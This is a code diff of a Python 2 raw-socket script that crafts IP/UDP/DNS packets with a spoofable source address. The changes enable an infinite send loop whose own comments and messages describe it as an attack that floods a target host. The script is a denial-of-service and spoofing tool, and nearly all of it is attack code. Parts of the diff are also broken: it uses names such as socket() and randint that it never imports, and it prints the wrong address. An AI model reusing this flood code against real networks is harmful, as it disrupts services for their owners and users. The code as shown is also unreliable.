@@ -1,4 +1,5 @@
 import socket, sys
+import time
 from struct import *
 
 # checksum functions needed for calculation checksum
@@ -19,19 +20,19 @@ def checksum(msg):
 
 # create a raw socket
 try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-except socket.error, msg:
+    s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
+except error, msg:
     print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
     sys.exit()
 
 # tell kernel not to put in headers, since we are providing it
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
 
 # now start constructing the packet
 packet = '';
 
-source_ip = '192.168.1.101'
-dest_ip = '192.168.0.12'  # '192.168.0.1' # or socket.gethostbyname('www.google.com')
+source_ip = '192.168.0.102' 
+dest_ip = '192.168.0.106'  # '192.168.0.1' # or gethostbyname('www.google.com')
 
 # ip header fields
 ihl = 5
@@ -41,10 +42,10 @@ tot_len = 20 + 20  # python seems to correctly fill the total length, dont know 
 id = 54321  # Id of this packet
 frag_off = 0
 ttl = 255
-protocol = socket.IPPROTO_UDP
+protocol = IPPROTO_UDP
 check = 10  # python seems to correctly fill the checksum
-saddr = socket.inet_aton(source_ip)  # Spoof the source ip address if you want to
-daddr = socket.inet_aton(dest_ip)
+saddr = inet_aton(source_ip)  # Spoof the source ip address if you want to
+daddr = inet_aton(dest_ip)
 
 ihl_version = (version << 4) + ihl
 # the ! in the pack format string means network order
@@ -83,8 +84,17 @@ packet = ip_header + udp_header + dns_header
 
 
 # Send the packet finally - the port specified has no effect
-print 'Enviando ataque para ' + dest_ip
-#while 1:
-s.sendto(packet, (dest_ip, 0))  # put this in a loop if you want to flood the target
+print 'Enviando ataque para ' + source_ip
+while 1:
+    id =randint(0,65534) 
+    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+    packet = ip_header + udp_header + dns_header
+
+
+    print 'enviando'
+    s.sendto(packet, (dest_ip, 0))  # put this in a loop if you want to flood the target
+
+    
+
 
 
